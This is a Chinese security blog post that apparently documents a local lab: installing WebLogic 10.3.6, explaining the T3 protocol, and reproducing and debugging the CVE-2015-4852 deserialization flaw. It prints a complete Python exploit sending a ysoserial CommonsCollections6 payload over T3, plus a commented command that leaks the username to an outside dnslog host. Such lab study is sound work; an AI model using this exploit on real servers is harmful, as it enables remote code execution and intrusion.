@@ -1,0 +1,246 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Weblogic学习1&amp;&amp;CVE-2015-4852分析 | jmx0hxq's blog</title><meta name="author" content="Jmx0hxq"><meta name="copyright" content="Jmx0hxq"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="环境配置weblogic下载链接: https:&#x2F;&#x2F;www.oracle.com&#x2F;middleware&#x2F;technologies&#x2F;weblogic-server-downloads.html选择10.3.6的Generic版本下载本地cmd执行:1java -D64 -jar wls1036_generic.jar这里报错了上网查了一下发现路径不能有中文,换个目录,正常安装一直下一步就行,安装完会">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic学习1&amp;&amp;CVE-2015-4852分析">
+<meta property="og:url" content="http://example.com/2024/04/05/weblogic%E5%AD%A6%E4%B9%A01/index.html">
+<meta property="og:site_name" content="jmx0hxq&#39;s blog">
+<meta property="og:description" content="环境配置weblogic下载链接: https:&#x2F;&#x2F;www.oracle.com&#x2F;middleware&#x2F;technologies&#x2F;weblogic-server-downloads.html选择10.3.6的Generic版本下载本地cmd执行:1java -D64 -jar wls1036_generic.jar这里报错了上网查了一下发现路径不能有中文,换个目录,正常安装一直下一步就行,安装完会">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/assets/sbpk/2.jpg">
+<meta property="article:published_time" content="2024-04-05T12:08:09.046Z">
+<meta property="article:modified_time" content="2024-04-05T12:13:16.036Z">
+<meta property="article:author" content="Jmx0hxq">
+<meta property="article:tag" content="JAVA安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/assets/sbpk/2.jpg"><link rel="shortcut icon" href="/assets/favicon.png"><link rel="canonical" href="http://example.com/2024/04/05/weblogic%E5%AD%A6%E4%B9%A01/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":800},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Weblogic学习1&&CVE-2015-4852分析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-05 20:13:16'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/jmx0hxq.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/assets/sbpk/2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="jmx0hxq's blog"><span class="site-name">jmx0hxq's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Weblogic学习1&amp;&amp;CVE-2015-4852分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-05T12:08:09.046Z" title="发表于 2024-04-05 20:08:09">2024-04-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-05T12:13:16.036Z" title="更新于 2024-04-05 20:13:16">2024-04-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Weblogic学习1&amp;&amp;CVE-2015-4852分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>weblogic下载链接: <a target="_blank" rel="noopener" href="https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html">https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html</a><br>选择10.3.6的Generic版本下载<br>本地cmd执行:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -D64 -jar wls1036_generic.jar</span><br></pre></td></tr></table></figure><br>这里报错了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405144058.png" alt="image.png"><br>上网查了一下发现路径不能有中文,换个目录,正常安装<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405144208.png" alt="image.png"><br>一直下一步就行,安装完会自动运行quickstart<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405144650.png" alt="image.png"><br>创建新的weblogic域,这里我会报错在执行/Middleware/wlserver_10.3/common/bin/config.exe的时候无法创建jvm,把jdk版本换成jdk1.7_80重新装一次就好了<br>一直下一步,配置域的名称和位置<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405150340.png" alt="image.png"><br>配置管理员用户名和密码<br>下一步选择生产模式,jdk选择<br>下一步选受管服务器、集群和计算机<br>后面就一直下一步就行</p>
+<p>安装完成后进入<code>Middleware\user_projects\domains\base_domain</code>双击运行startWebLogic.cmd,输入刚才填的用户名和密码<br>访问: <a target="_blank" rel="noopener" href="http://127.0.0.1:7001/console/login/LoginForm.jsp">http://127.0.0.1:7001/console/login/LoginForm.jsp</a><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405150918.png" alt="image.png"></p>
+<p>配置debug:<br>在startWebLogic.cmd文件的前面加上:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set JAVA_OPTIONS=-Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,address=9999,server=y,suspend=n</span><br></pre></td></tr></table></figure></p>
+<p>双击运行<br>观察本地9999端口<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405154934.png" alt="image.png"><br>IDEA打开wlserver文件夹作为项目,library加入<code>Middleware\wlserver_10.3\server\lib</code>文件夹,新建配置文件<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405155932.png" alt="image.png"><br>双击shift,搜WLSServletAdapter,在handle函数下个断点<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405160107.png" alt="image.png"><br>运行debug,访问: <a target="_blank" rel="noopener" href="http://localhost:7001/wls-wsat/CoordinatorPortType">http://localhost:7001/wls-wsat/CoordinatorPortType</a><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405160210.png" alt="image.png"><br>成功拦截</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h3><p>它是weblogic独有的一个协议,在weblogic中对rmi的传输就是使用的T3协议<br>它包含请求头和请求体<br>eg.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Test</span>(<span class="params">ip,port</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip, port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span> <span class="comment">#请求包的头</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    T3Test(ip,port)</span><br></pre></td></tr></table></figure><br>wireshark监听本地环回地址127.0.0.1:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405184736.png" alt="image.png"></p>
+<p>筛选条件: <code>tcp.port==7001</code><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405184839.png" alt="image.png"><br>可以发现返回包里有weblogic的版本信息: 10.3.6.0<br>关于weblogic的请求体结构,我们参考z_zz_zzz师傅文章(原文链接: <a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/web-13470.html)的图片">http://drops.xmd5.com/static/drops/web-13470.html)的图片</a>:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/image.png" alt="image.png"></p>
+<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/img.png" alt="img.png"></p>
+<p>第一个非Java序列化数据是我们的请求头<code>t3 12.2.3 AS:255 HL:19 MS:10000000 PU:t3://us-l-breens:7001</code>,后面的2到7部分数据都是序列化数据,我们只要修改其中一个为恶意数据发给服务端就可以造成反序列化攻击<br>还有一种攻击方式是将第一部分数据和恶意数据进行拼接</p>
+<h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload1</span>(<span class="params">gadget, command</span>):</span><br><span class="line">    JAR_FILE = <span class="string">&#x27;ysoserial.jar&#x27;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload2</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">host, port, payload</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;HELO:(.*).false&quot;</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(version) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Weblogic &#123;&#125;&quot;</span>.<span class="built_in">format</span>(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>) <span class="comment">#数据包长度，先占位，后面会根据实际情况重新</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="comment">#t3协议头</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections6&quot;</span> <span class="comment">#CommonsCollections1 Jdk7u21</span></span><br><span class="line">    command = <span class="string">&quot;calc&quot;</span></span><br><span class="line">    <span class="comment"># command = &quot;curl http://`whoami`.5dhwnx.dnslog.cn&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    <span class="comment">#payload=get_payload2(&#x27;./pay.tmp&#x27;)</span></span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure><br>这里选的CC6不受jdk版本限制<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405190655.png" alt="image.png"></p>
+<p>注意:</p>
+<ul>
+<li>当前文件夹放ysoserial.jar</li>
+<li>这里我加入了一句time.sleep(1)是因为python socket 如果是频繁发包，会被服务端所拒绝,第一次recv的内容只有HELO没有后面的内容,if语句过不了会直接return<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Test</span>(<span class="params">ip,port</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip, port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span> <span class="comment">#请求包的头</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line"></span><br><span class="line">    T3Test(ip,port)</span><br></pre></td></tr></table></figure>
+如果注释掉sleep会只返回HELO,不注释就会返回<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HELO:10.3.6.0.false</span><br><span class="line">AS:2048</span><br><span class="line">HL:19</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>关键的数据拼接:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data_len = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>) <span class="comment">#数据包长度，先占位，后面会根据实际情况重新</span></span><br><span class="line">t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="comment">#t3协议头</span></span><br><span class="line">flag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">payload = data_len + t3header + flag + payload</span><br><span class="line">payload = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405192212.png" alt="image.png"></p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里能调用成功是因为它自带了commons-collections的包<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405193643.png" alt="image.png"></p>
+<p>我们在InboundMsgAbbrev的readObject()方法下断点<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405195449.png" alt="image.png"><br>先会调用ServerChannelInputStream的readObject()方法,而且ServerChannelInputStream是继承ObjectInputstream的<br>然后调用一系列的readObejct:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.readObject</span><br><span class="line">ObjectInputstream.readObject0</span><br><span class="line">ObjectInputstream.readOrdinary</span><br><span class="line">...</span><br><span class="line">InboundMsgAbbrev的resolveClass</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405195811.png" alt="image.png"><br>这里<code>super.resolveClass</code>还是调用了<code>ObjectInputstream.resolveClass</code><br>此时的var2就是解析的java.util.hashSet<br>不断调用这个方法…<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405200308.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405200403.png" alt="image.png"><br>最后执行命令</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/616728">https://developer.aliyun.com/article/616728</a></li>
+<li><a target="_blank" rel="noopener" href="https://boogipop.com/2023/04/26/Weblogic%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0">https://boogipop.com/2023/04/26/Weblogic%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0</a></li>
+<li><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Jmx0hxq</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/04/05/weblogic%E5%AD%A6%E4%B9%A01/">http://example.com/2024/04/05/weblogic%E5%AD%A6%E4%B9%A01/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">jmx0hxq's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a></div><div class="post_share"><div class="social-share" data-image="/assets/sbpk/2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/06/Weblogic%E5%AD%A6%E4%B9%A02/" title="Weblogic学习2-一些历史漏洞的复现"><img class="cover" src="/assets/sbpk/3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Weblogic学习2-一些历史漏洞的复现</div></div></a></div><div class="next-post pull-right"><a 